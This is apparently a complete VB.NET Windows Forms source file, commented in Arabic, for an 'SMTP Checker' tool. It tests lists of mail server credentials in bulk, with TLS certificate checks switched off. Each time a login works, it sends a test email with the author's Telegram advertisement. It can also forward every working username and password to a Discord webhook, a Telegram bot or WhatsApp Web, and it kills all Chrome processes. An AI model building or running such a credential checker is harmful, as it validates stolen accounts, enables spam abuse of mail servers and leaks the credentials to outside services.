Imports System.Net.Mail
Imports System.Net
Imports System.Collections.Concurrent
Imports System.IO
Imports System.Text

Public Class Form1
    ' قائمة تخزين النتائج
    Private results As New ConcurrentQueue(Of (String, String, String)) ' نضيف الحساب الأصلي أيضاً

    ' عداد للحسابات الناجحة والفاشلة والتي تحتوي على مشاكل
    Private successCount As Integer = 0
    Private failedCount As Integer = 0
    Private problemCount As Integer = 0

    ' عدد المهام المتزامنة
    Private Const MaxDegreeOfParallelism As Integer = 4 ' يمكن تعديله إلى 6، 10، إلخ

    ' متغيرات لتخزين Webhook الـ Discord و Telegram
    Private discordWebhookUrl As String = ""
    Private telegramBotToken As String = ""
    Private telegramChatId As String = ""

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' إعداد الأعمدة في ListView
        ResultsListView.View = View.Details
        ResultsListView.Columns.Add("Account Status", -2, HorizontalAlignment.Left)

        ' إعداد حدث الضغط المزدوج على العناصر في ListView
        AddHandler ResultsListView.DoubleClick, AddressOf ResultsListView_DoubleClick

        ' قراءة Webhook وبيانات Telegram من الملفات
        discordWebhookUrl = GetWebhookFromFile("discord_webhook.txt")
        telegramBotToken = GetWebhookFromFile("telegram_bot_token.txt")
        telegramChatId = GetWebhookFromFile("telegram_chat_id.txt")
    End Sub

    ' دالة لبدء عملية تسجيل الدخول لكل حساب
    Private Async Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
        ' إعادة تعيين العدادات
        successCount = 0
        failedCount = 0
        problemCount = 0

        ' احصل على قائمة الحسابات من الـ TextBox الجديد
        Dim accountsList As String = AccountsTextBox.Text

        ' تحليل القائمة وفحص كل حساب
        Dim accounts As List(Of String) = ParseAccountsList(accountsList)

        ' فحص الحسابات بشكل متوازي
        Dim tasks As New List(Of Task)()
        Dim partitionSize As Integer = Math.Ceiling(accounts.Count / CDbl(MaxDegreeOfParallelism))

        For i As Integer = 0 To accounts.Count - 1 Step partitionSize
            Dim partition = accounts.Skip(i).Take(partitionSize).ToList()
            tasks.Add(Task.Run(Sub() CheckAccounts(partition)))
        Next

        ' الانتظار حتى تنتهي جميع المهام
        Await Task.WhenAll(tasks)

        ' تحديث واجهة المستخدم بعد الانتهاء من الفحص
        Me.Invoke(New Action(Sub()
                                 UpdateListView()
                                 ScrollToBottom()
                             End Sub))

        ' حفظ النتائج في المستندات بعد الانتهاء من الفحص
        SaveResultsToFile()
    End Sub

    ' دالة لتحليل قائمة الحسابات
    Private Function ParseAccountsList(accountsList As String) As List(Of String)
        ' إرجاع السطور كما هي من الـ TextBox
        Return accountsList.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries).ToList()
    End Function

    ' دالة للتحقق من مجموعة حسابات بشكل متوازي
    Private Sub CheckAccounts(accounts As List(Of String))
        For Each account In accounts
            Dim parts() As String = account.Split(AccountSplitTextBox.Text.ToCharArray(), StringSplitOptions.None)
            If parts.Length >= 4 Then
                Dim smtpServer As String = parts(0).Trim()
                Dim smtpPort As Integer = Integer.Parse(parts(1).Trim())
                Dim username As String = parts(2).Trim()
                Dim password As String = parts(3).Trim()

                ' فحص الحساب باستخدام Task
                Try
                    CheckSmtpAccount(smtpServer, smtpPort, username, password, account)
                Catch ex As Exception
                    ' تسجيل أي خطأ في الفحص
                    AddResult($"Error processing {account}: {ex.Message}", "Problem", account)
                    problemCount += 1
                End Try

                ' تحديث واجهة المستخدم بعد كل عملية فحص
                Me.Invoke(New Action(Sub()
                                         UpdateListView()
                                         ScrollToBottom()
                                     End Sub))
            End If
        Next
    End Sub

    ' دالة للتحقق من تسجيل الدخول إلى SMTP
    Private Sub CheckSmtpAccount(host As String, port As Integer, user As String, password As String, originalAccount As String)
        Try
            ' إعداد عميل SMTP لكل حساب بشكل منفصل
            Using client As New SmtpClient(host, port)
                client.EnableSsl = True
                client.Credentials = New NetworkCredential(user, password)

                ' تعطيل التحقق من الشهادات (ليس مستحسناً في بيئة الإنتاج)
                ServicePointManager.ServerCertificateValidationCallback = Function(sender, certificate, chain, sslPolicyErrors) True

                ' إرسال بريد تجريبي
                client.Send(FromExampleTextBox.Text, ToExampleTextBox.Text, SubjectTextBox.Text, "Don't Forget To Join My Telegram For More Tools:https://t.me/MONSTERMCSY :   " & EmailMsgTextBox.Text)

                ' إذا نجح الدخول، اضف نتيجة النجاح
                AddResult($"Login successful for {user}", "Success", originalAccount)
                successCount += 1
                ' إرسال الحساب الناجح إلى Discord وTelegram إذا كان CheckBox1 و CheckBox2 مفعلين
                If Guna2CheckBox1.Checked Then
                    SendToDiscord(originalAccount)
                End If
                If Guna2CheckBox2.Checked Then
                    SendToTelegram(originalAccount)
                End If
            End Using
        Catch ex As SmtpException
            If ex.StatusCode = SmtpStatusCode.GeneralFailure Then
                ' إذا كانت هناك مشكلة معينة
                AddResult($"Problem for {user}: {ex.Message}", "Problem", originalAccount)
                problemCount += 1
            Else
                ' إذا فشل الدخول، اضف نتيجة الفشل
                AddResult($"Login failed for {user}: {ex.Message}", "Failed", originalAccount)
                failedCount += 1
            End If
        End Try
    End Sub
    ' تعديل دالة AddResult لإضافة دعم WhatsApp
    Private Sub AddResult(result As String, status As String, originalAccount As String)
        ' نضيف النتيجة إلى قائمة النتائج مع الحساب الأصلي
        results.Enqueue((result, status, originalAccount))

        ' تحديث العداد الخاص بكل حالة
        Me.Invoke(New Action(Sub()
                                 SuccessLabel.Text = $"Success: {successCount}"
                                 FailedLabel.Text = $"Failed: {failedCount}"
                                 ProblemLabel.Text = $"Problem: {problemCount}"
                             End Sub))

        ' إذا كانت النتيجة نجاحاً وتم تفعيل خيار الإرسال إلى Discord
        If status = "Success" AndAlso Guna2CheckBox1.Checked Then
            SendToDiscord(originalAccount)
        End If

        ' إذا كانت النتيجة نجاحاً وتم تفعيل خيار الإرسال إلى Telegram
        If status = "Success" AndAlso Guna2CheckBox2.Checked Then
            SendToTelegram(originalAccount)
        End If

        ' إذا كانت النتيجة نجاحاً وتم تفعيل خيار الإرسال إلى WhatsApp
        If status = "Success" AndAlso Guna2CheckBox3.Checked Then
            SendToWhatsApp(originalAccount)
        End If
    End Sub

#Region "Discord Sender"
    ' دالة لإرسال الحساب الناجح إلى Discord Webhook
    Private Sub SendToDiscord(account As String)
        ' التحقق من أن CheckBox1 مفعل
        If Not Guna2CheckBox1.Checked Then
            Return ' إذا لم يكن مفعلًا، نخرج من الدالة بدون تنفيذ شيء
        End If

        Dim webhookUrl As String = GetWebhookFromFile("discord_webhook.txt")

        ' التأكد من أن الـ Webhook موجود وصحيح
        If String.IsNullOrEmpty(webhookUrl) OrElse Not IsValidWebhook(webhookUrl) Then
            MessageBox.Show("Invalid or missing Discord Webhook URL.", "Webhook Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If

        ' إعداد محتوى الرسالة
        Dim jsonData As String = "{""content"": ""Login successful for account: " & account & """, ""username"": ""SMTP Checker Tool By MONSTERMC""}"

        ' إرسال الرسالة
        Try
            Dim request As WebRequest = WebRequest.Create(webhookUrl)
            request.Method = "POST"
            request.ContentType = "application/json"
            Using streamWriter As New StreamWriter(request.GetRequestStream())
                streamWriter.Write(jsonData)
            End Using

            Dim response As WebResponse = request.GetResponse()
            Using responseStream As Stream = response.GetResponseStream()
                ' قراءة الاستجابة (إذا كانت تحتاج إلى ذلك)
            End Using
        Catch ex As Exception
            MessageBox.Show($"Failed to send to Discord: {ex.Message}", "Webhook Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub
#End Region

#Region "Telegram Sender"
    ' دالة لإرسال الحساب الناجح إلى Telegram
    Private Sub SendToTelegram(account As String)
        ' التحقق من أن CheckBox2 مفعل
        If Not Guna2CheckBox2.Checked Then
            Return ' إذا لم يكن مفعلًا، نخرج من الدالة بدون تنفيذ شيء
        End If

        Dim botToken As String = GetWebhookFromFile("telegram_bot_token.txt")
        Dim chatId As String = GetWebhookFromFile("telegram_chat_id.txt")

        ' التأكد من أن الـ Bot Token و Chat ID موجودان وصحيحان
        If String.IsNullOrEmpty(botToken) OrElse String.IsNullOrEmpty(chatId) Then
            MessageBox.Show("Invalid or missing Telegram Bot Token or Chat ID.", "Telegram Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If

        ' إعداد محتوى الرسالة
        Dim message As String = "Login successful for account: " & account
        Dim url As String = $"https://api.telegram.org/bot{botToken}/sendMessage?chat_id={chatId}&text={Uri.EscapeDataString(message)}"

        ' إرسال الرسالة
        Try
            Dim request As WebRequest = WebRequest.Create(url)
            request.Method = "GET"

            Using response As WebResponse = request.GetResponse()
                Using responseStream As Stream = response.GetResponseStream()
                    ' قراءة الاستجابة (إذا كانت تحتاج إلى ذلك)
                End Using
            End Using
        Catch ex As Exception
            MessageBox.Show($"Failed to send to Telegram: {ex.Message}", "Telegram Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub
#End Region

    ' دالة لحفظ الـ Webhook في الملف
    Private Sub SaveWebhookToFile(webhookUrl As String, fileName As String)
        File.WriteAllText(fileName, webhookUrl)
    End Sub

    ' دالة لاسترجاع الـ Webhook من الملف
    Private Function GetWebhookFromFile(fileName As String) As String
        If File.Exists(fileName) Then
            Return File.ReadAllText(fileName).Trim()
        Else
            Return String.Empty
        End If
    End Function

    ' دالة للتحقق من صحة الـ Webhook
    Private Function IsValidWebhook(webhookUrl As String) As Boolean
        Try
            Dim request As WebRequest = WebRequest.Create(webhookUrl)
            request.Method = "POST"
            request.ContentType = "application/json"
            Dim jsonData As String = "{""content"": ""Testing Webhook"", ""username"": ""Webhook Tester""}"
            Using streamWriter As New StreamWriter(request.GetRequestStream())
                streamWriter.Write(jsonData)
            End Using

            Dim response As WebResponse = request.GetResponse()
            Using responseStream As Stream = response.GetResponseStream()
                ' التحقق من وجود استجابة (نجاح الاختبار)
            End Using
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    ' دالة لطلب الـ Webhook من المستخدم
    Private Function PromptForWebhook(fileName As String) As String
        Dim input As String = InputBox("Please enter the Webhook URL:", "Enter Webhook")
        SaveWebhookToFile(input, fileName)
        Return input.Trim()
    End Function

    Private Sub Guna2CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox1.CheckedChanged
        ' إذا تم تفعيل الـ CheckBox1
        If Guna2CheckBox1.Checked Then
            ' عند تحديد الـ CheckBox1، نتحقق من وجود الـ Webhook
            Dim webhookUrl As String = GetWebhookFromFile("discord_webhook.txt")

            ' إذا كان الـ Webhook موجودًا، نتحقق من صحته
            If Not String.IsNullOrEmpty(webhookUrl) AndAlso IsValidWebhook(webhookUrl) Then
                MessageBox.Show("Discord Webhook is valid and ready to use.", "Webhook Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                ' إذا لم يكن الـ Webhook صالحًا أو لم يكن موجودًا، نطلب إدخاله
                webhookUrl = PromptForWebhook("discord_webhook.txt")

                ' نتحقق مرة أخرى من صحة الـ Webhook قبل حفظه
                If IsValidWebhook(webhookUrl) Then
                    SaveWebhookToFile(webhookUrl, "discord_webhook.txt")
                    MessageBox.Show("Discord Webhook saved and is valid.", "Webhook Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Else
                    MessageBox.Show("Invalid Discord Webhook URL. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Guna2CheckBox1.Checked = False ' إلغاء التفعيل إذا كان الرابط غير صالح
                End If
            End If
        End If
    End Sub

    Private Sub Guna2CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox2.CheckedChanged
        ' إذا تم تفعيل الـ CheckBox2
        If Guna2CheckBox2.Checked Then
            ' عند تحديد الـ CheckBox2، نتحقق من وجود بيانات Telegram
            Dim botToken As String = GetWebhookFromFile("telegram_bot_token.txt")
            Dim chatId As String = GetWebhookFromFile("telegram_chat_id.txt")

            ' إذا كانت بيانات Telegram موجودة وصحيحة
            If Not String.IsNullOrEmpty(botToken) AndAlso Not String.IsNullOrEmpty(chatId) Then
                MessageBox.Show("Telegram Bot Token and Chat ID are valid and ready to use.", "Telegram Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Else
                ' إذا كانت البيانات غير موجودة، نطلب إدخالها
                botToken = InputBox("Please enter the Telegram Bot Token:", "Enter Bot Token").Trim()
                chatId = InputBox("Please enter the Telegram Chat ID:", "Enter Chat ID").Trim()

                ' التحقق من صحة البيانات
                If Not String.IsNullOrEmpty(botToken) AndAlso Not String.IsNullOrEmpty(chatId) Then
                    SaveWebhookToFile(botToken, "telegram_bot_token.txt")
                    SaveWebhookToFile(chatId, "telegram_chat_id.txt")
                    MessageBox.Show("Telegram Bot Token and Chat ID saved.", "Telegram Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
                Else
                    MessageBox.Show("Invalid Telegram Bot Token or Chat ID. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                    Guna2CheckBox2.Checked = False ' إلغاء التفعيل إذا كانت البيانات غير صالحة
                End If
            End If
        End If
    End Sub

    ' دالة لحفظ النتائج في ملفات منفصلة
    Private Sub SaveResultsToFile()
        Dim successList As New List(Of String)
        Dim failedList As New List(Of String)
        Dim problemList As New List(Of String)

        For Each result In results
            Select Case result.Item2
                Case "Success"
                    successList.Add(result.Item3) ' حفظ الحساب الأصلي كما هو
                Case "Failed"
                    failedList.Add(result.Item3) ' حفظ الحساب الأصلي كما هو
                Case "Problem"
                    problemList.Add(result.Item3) ' حفظ الحساب الأصلي كما هو
            End Select
        Next

        ' حفظ الحسابات الناجحة والفاشلة والتي تحتوي على مشاكل في ملفات نصية
        File.WriteAllLines("successful_accounts.txt", successList)
        File.WriteAllLines("failed_accounts.txt", failedList)
        File.WriteAllLines("problem_accounts.txt", problemList)
    End Sub

    ' تحديث ListView لعرض النتائج
    Private Sub UpdateListView()
        ResultsListView.Items.Clear()

        For Each result In results
            ' هنا سيتم عرض حالة الحساب في بداية السطر
            Dim listItem As New ListViewItem(result.Item2 & ": " & result.Item3) ' حالة الحساب أولاً ثم الحساب الأصلي

            ' تخصيص اللون بناءً على النتيجة
            Select Case result.Item2
                Case "Success"
                    listItem.ForeColor = Color.Green
                Case "Failed"
                    listItem.ForeColor = Color.FromArgb(211, 84, 84)
                Case "Problem"
                    listItem.ForeColor = Color.Orange
            End Select

            ResultsListView.Items.Add(listItem)
        Next
    End Sub
#Region "Whtssap Code"
    ' متغير لتخزين رقم هاتف WhatsApp
    Private whatsappPhoneNumber As String = ""

    ' دالة لطلب رقم هاتف WhatsApp من المستخدم
    Private Function PromptForWhatsAppPhoneNumber() As String
        Dim phoneNumber As String = InputBox("Please enter your WhatsApp phone number (with country code):", "Enter WhatsApp Phone Number")
        SaveWhatsAppPhoneNumberToFile(phoneNumber)
        Return phoneNumber.Trim()
    End Function

    ' دالة لحفظ رقم هاتف WhatsApp في الملف
    Private Sub SaveWhatsAppPhoneNumberToFile(phoneNumber As String)
        Dim phoneFilePath As String = "whatsapp_phone_number.txt"
        File.WriteAllText(phoneFilePath, phoneNumber)
    End Sub

    ' دالة لاسترجاع رقم هاتف WhatsApp من الملف
    Private Function GetWhatsAppPhoneNumberFromFile() As String
        Dim phoneFilePath As String = "whatsapp_phone_number.txt"
        Return If(File.Exists(phoneFilePath), File.ReadAllText(phoneFilePath).Trim(), String.Empty)
    End Function

#Region "WhatsApp Sender"
    ' دالة لإرسال الحساب الناجح إلى WhatsApp Web
    Private Sub SendToWhatsApp(account As String)
        ' التحقق من أن CheckBox3 مفعل
        If Not Guna2CheckBox3.Checked Then
            Return ' إذا لم يكن مفعلًا، نخرج من الدالة بدون تنفيذ شيء
        End If

        ' استرجاع رقم هاتف WhatsApp من الملف
        Dim phoneNumber As String = GetWhatsAppPhoneNumberFromFile()

        ' التأكد من أن رقم الهاتف موجود وصحيح
        If String.IsNullOrEmpty(phoneNumber) Then
            MessageBox.Show("Invalid or missing WhatsApp phone number.", "WhatsApp Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If

        ' إعداد محتوى الرسالة
        Dim message As String = $"Login successful for account: {account}"
        Dim encodedMessage As String = Uri.EscapeDataString(message)
        Dim url As String = $"https://web.whatsapp.com/send?phone={phoneNumber}&text={encodedMessage}"

        ' فتح رابط WhatsApp Web في المتصفح
        Try
            Process.Start(url)
            System.Threading.Thread.Sleep(8000) ' الانتظار لمدة 5 ثوانٍ (يمكنك تعديل هذه القيمة حسب الحاجة)
            SendKeys.SendWait("{ENTER}")
            System.Threading.Thread.Sleep(2000)
            KillChrome()
        Catch ex As Exception
            MessageBox.Show($"Failed to open WhatsApp link: {ex.Message}", "WhatsApp Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub
    Sub KillChrome()
        ' احصل على جميع العمليات التي تعمل باسم "chrome"
        For Each proc As Process In Process.GetProcessesByName("chrome")
            Try
                ' إنهاء العملية
                proc.Kill()
            Catch ex As Exception
                ' يمكن التعامل مع الاستثناءات هنا
                'MessageBox.Show("حدث خطأ: " & ex.Message)
            End Try
        Next
    End Sub
#End Region

    Private Sub Guna2CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox3.CheckedChanged
        ' إذا تم تفعيل الـ CheckBox3
        If Guna2CheckBox3.Checked Then
            MsgBox("Please Make Sure u Open Whatsapp Web On Your Browser, and when you use this feature you need to let this tool work without touching anything" & vbNewLine & "يرجى التأكد من فتح WhatsApp Web على متصفحك" & vbNewLine & "وعندما تستخدم هذه الميزة، يجب عليك ترك هذه الأداة تعمل دون لمس أي شيء")
            ' عند تحديد الـ CheckBox3، نتحقق من وجود رقم الهاتف
            whatsappPhoneNumber = GetWhatsAppPhoneNumberFromFile()

            ' إذا كان رقم الهاتف غير موجود، نطلب إدخاله
            If String.IsNullOrEmpty(whatsappPhoneNumber) Then
                whatsappPhoneNumber = PromptForWhatsAppPhoneNumber()
            End If

            ' نتحقق من صحة رقم الهاتف قبل حفظه
            If String.IsNullOrEmpty(whatsappPhoneNumber) Then
                MessageBox.Show("Invalid WhatsApp phone number. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Guna2CheckBox3.Checked = False ' إلغاء التفعيل إذا كان الرقم غير صالح
            End If
        End If
    End Sub

#End Region
    ' دالة لتمرير ListView إلى الأسفل
    Private Sub ScrollToBottom()
        If ResultsListView.Items.Count > 0 Then
            ResultsListView.EnsureVisible(ResultsListView.Items.Count - 1)
        End If
    End Sub

    ' حدث الضغط المزدوج على عنصر في ListView
    Private Sub ResultsListView_DoubleClick(sender As Object, e As EventArgs)
        If ResultsListView.SelectedItems.Count > 0 Then
            ' نسخ النص المحدد إلى الحافظة
            Dim selectedItemText As String = ResultsListView.SelectedItems(0).Text
            Clipboard.SetText(selectedItemText)
        End If
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        End
    End Sub
End Class